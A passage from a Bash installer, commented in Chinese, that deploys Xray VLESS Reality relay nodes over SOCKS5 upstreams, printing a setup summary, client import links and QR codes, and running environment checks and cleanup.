    echo -e "  ${CYAN}下载速度：${DOWNLOAD_RESULT}${NC}\n"
    
    echo -e "${WHITE}${BOLD}🌐 SOCKS5节点映射：${NC}"
    local node_index=0
    for node_key in "${SOCKS5_NODES[@]}"; do
        local node_config_json="${NODE_CONFIGS[$node_key]}"
        local server=$(echo "$node_config_json" | jq -r '.server')
        local port=$(echo "$node_config_json" | jq -r '.port')
        local relay_port=$(echo "$node_config_json" | jq -r '.relay_port')
        local user=$(echo "$node_config_json" | jq -r '.user')
        echo -e "  ${PURPLE}节点 $((node_index + 1))：${YELLOW}${server}:${port} ${PURPLE}-> ${CYAN}VLESS端口 ${relay_port} ${PURPLE}(${user})${NC}"
        ((node_index++))
    done
    echo ""
    
    echo -e "${WHITE}${BOLD}📋 配置文件位置：${NC}"
    echo -e "  ${CYAN}Xray配置：${YELLOW}/etc/xray/config.json${NC}"
    echo -e "  ${CYAN}导出配置：${YELLOW}${CONFIG_FILE}${NC}"
    echo -e "  ${CYAN}VLESS链接：${YELLOW}${VLESS_LINKS_FILE}${NC}\n"
    
    echo -e "${WHITE}${BOLD}🛠️ 常用命令：${NC}"
    echo -e "  ${CYAN}查看状态：${YELLOW}systemctl status xray${NC}"
    echo -e "  ${CYAN}重启服务：${YELLOW}systemctl restart xray${NC}"
    echo -e "  ${CYAN}查看日志：${YELLOW}journalctl -u xray -f${NC}"
    echo -e "  ${CYAN}防火墙状态：${YELLOW}ufw status${NC}\n"
    
    echo -e "${WHITE}${BOLD}📈 优化特性：${NC}"
    echo -e "  ${GREEN}${ICON_SUCCESS} BBR拥塞控制已启用${NC}"
    echo -e "  ${GREEN}${ICON_SUCCESS} TCP Fast Open已启用${NC}"
    echo -e "  ${GREEN}${ICON_SUCCESS} CN2网络优化已配置${NC}"
    echo -e "  ${GREEN}${ICON_SUCCESS} 内核参数已优化${NC}"
    echo -e "  ${GREEN}${ICON_SUCCESS} 多节点防火墙已配置${NC}\n"
    
    echo -e "${PURPLE}${BOLD}${ICON_INFO} 部署完成时间：${YELLOW}$(date '+%Y-%m-%d %H:%M:%S')${NC}"
    
    # 保存客户端配置提示
    echo -e "${YELLOW}${BOLD}💡 客户端配置提示：${NC}"
    echo -e "  ${WHITE}1. 复制下方任意一个 vless:// 链接${NC}"
    echo -e "  ${WHITE}2. 在客户端中选择 '从剪贴板导入' 或 '扫描二维码'${NC}"
    echo -e "  ${WHITE}3. 确保客户端支持 Reality、uTLS 和 Vision${NC}"
    echo -e "  ${WHITE}4. 推荐客户端：v2rayN (Windows)、v2rayNG (Android)、shadowrocket (iOS)${NC}"
    echo -e "  ${WHITE}5. 不同节点使用不同端口，可根据速度选择最优节点${NC}\n"
    
    # 安全提醒
    echo -e "${RED}${BOLD}🔒 安全提醒：${NC}"
    echo -e "  ${WHITE}• 请妥善保存配置信息，不要泄露给他人${NC}"
    echo -e "  ${WHITE}• 监控服务器流量，避免异常使用${NC}"
    echo -e "  ${WHITE}• 多节点可分散风险，建议轮换使用${NC}\n"
    
    echo -e "${CYAN}${BOLD}═══════════════════════════════════════════════════════════════════════════════${NC}\n"
}

# ========== 显示所有节点信息 ==========
show_all_nodes_info() {
    echo -e "${GREEN}${BOLD}🔗 所有节点链接（可直接导入客户端）：${NC}\n"
    
    local node_index=0
    for node_key in "${SOCKS5_NODES[@]}"; do
        local node_config_json="${NODE_CONFIGS[$node_key]}"
        local server=$(echo "$node_config_json" | jq -r '.server')
        local port=$(echo "$node_config_json" | jq -r '.port')
        local relay_port=$(echo "$node_config_json" | jq -r '.relay_port')
        local uuid=$(echo "$node_config_json" | jq -r '.uuid')
        local user=$(echo "$node_config_json" | jq -r '.user')
        local short_id=$(echo "$node_config_json" | jq -r '.short_id')
        
        # 构造VLESS Reality节点链接
        local vless_link="vless://${uuid}@${NODE_IP}:${relay_port}?encryption=none&flow=xtls-rprx-vision&security=reality&sni=${DOMAIN}&fp=chrome&pbk=${REALITY_PUBLIC_KEY}&sid=${short_id}&type=tcp&headerType=none#${user}_Reality_Node${node_index}_${NODE_IP}"
        
        echo -e "${PURPLE}${BOLD}节点 $((node_index + 1)) (${server}:${port} -> ${relay_port})：${NC}"
        echo -e "${YELLOW}${vless_link}${NC}"
        echo ""
        
        ((node_index++))
    done
    
    echo -e "${GREEN}${BOLD}📱 二维码（节点1示例，其他节点请使用对应链接）：${NC}"
    echo -e "${CYAN}"
    # 显示第一个节点的二维码作为示例
    if [[ ${#SOCKS5_NODES[@]} -gt 0 ]]; then
        local first_node_key="${SOCKS5_NODES[0]}"
        local first_node_config_json="${NODE_CONFIGS[$first_node_key]}"
        local first_relay_port=$(echo "$first_node_config_json" | jq -r '.relay_port')
        local first_uuid=$(echo "$first_node_config_json" | jq -r '.uuid')
        local first_user=$(echo "$first_node_config_json" | jq -r '.user')
        local first_short_id=$(echo "$first_node_config_json" | jq -r '.short_id')
        
        local first_vless_link="vless://${first_uuid}@${NODE_IP}:${first_relay_port}?encryption=none&flow=xtls-rprx-vision&security=reality&sni=${DOMAIN}&fp=chrome&pbk=${REALITY_PUBLIC_KEY}&sid=${first_short_id}&type=tcp&headerType=none#${first_user}_Reality_Node0_${NODE_IP}"
        
        echo "${first_vless_link}" | qrencode -o - -t ANSIUTF8
    fi
    echo -e "${NC}\n"
    
    echo -e "${CYAN}${BOLD}═══════════════════════════════════════════════════════════════════════════════${NC}"
    echo -e "${WHITE}${BOLD}💾 所有配置已保存到：${YELLOW}${VLESS_LINKS_FILE}${NC}"
    echo -e "${WHITE}可使用命令查看所有链接：${YELLOW}cat ${VLESS_LINKS_FILE}${NC}\n"
}

# ========== 错误处理 ==========
handle_error() {
    local exit_code=$?
    local line_number=$1
    local command="$2"
    
    echo -e "\n${RED}${BOLD}${ICON_ERROR} 脚本执行过程中出现错误！${NC}"
    echo -e "${WHITE}错误行号：${YELLOW}$line_number${NC}"
    echo -e "${WHITE}错误命令：${YELLOW}$command${NC}"
    echo -e "${WHITE}错误代码：${YELLOW}$exit_code${NC}"
    
    # 如果是配置文件生成失败，显示更多信息
    if [[ -f /etc/xray/config.json ]]; then
        echo -e "${WHITE}配置文件已生成，检查语法：${NC}"
        if command -v ${XRAY_BIN} >/dev/null 2>&1; then
            ${XRAY_BIN} -test -config /etc/xray/config.json 2>&1 || true
        fi
    fi
    
    echo -e "${WHITE}请检查网络连接和系统权限后重试。${NC}\n"
    exit 1
}

# 修改错误陷阱设置，不要在配置生成时立即退出
# trap 'handle_error ${LINENO} "$BASH_COMMAND"' ERR

# ========== 环境检查 ==========
check_environment() {
    echo -e "${BLUE}${BOLD}${ICON_INFO} 检查运行环境...${NC}"
    
    # 检查是否为root用户
    if [[ $EUID -ne 0 ]]; then
        echo -e "${RED}${ICON_ERROR} 此脚本需要root权限运行！${NC}"
        echo -e "${WHITE}请使用：${YELLOW}sudo bash $0${NC}"
        exit 1
    fi
    
    # 检查磁盘空间
    available_space=$(df / | awk 'NR==2 {print $4}')
    if [[ $available_space -lt 1048576 ]]; then  # 1GB = 1048576KB
        echo -e "${RED}${ICON_ERROR} 磁盘空间不足（需要至少1GB可用空间）！${NC}"
        echo -e "${WHITE}当前可用空间：${YELLOW}$(($available_space/1024))MB${NC}"
        exit 1
    fi
    
    echo -e "${GREEN}${ICON_SUCCESS} 环境检查通过${NC}\n"
}

# ========== 清理函数 ==========
cleanup_on_exit() {
    echo -e "\n${YELLOW}${ICON_INFO} 正在清理临时文件...${NC}"
    # 清理可能的临时文件
    rm -f /tmp/xray_install_*
    rm -f /usr/local/bin/xray.zip 2>/dev/null || true
}

# 设置退出时清理
trap cleanup_on_exit EXIT

# ========== 脚本入口 ==========
echo -e "${BLUE}${BOLD}正在初始化多节点中转脚本环境...${NC}\n"

# 环境检查
check_environment

# 执行主安装流程
main_install

# 脚本结束
echo -e "${GREEN}${BOLD}🎊 多节点中转部署任务执行完毕！${NC}"
echo -e "${WHITE}如有问题，请查看日志文件：${YELLOW}/var/log/xray/${NC}"
echo -e "${WHITE}节点配置文件：${YELLOW}${CONFIG_FILE}${NC}"
echo -e "${WHITE}VLESS链接文件：${YELLOW}${VLESS_LINKS_FILE}${NC}\n"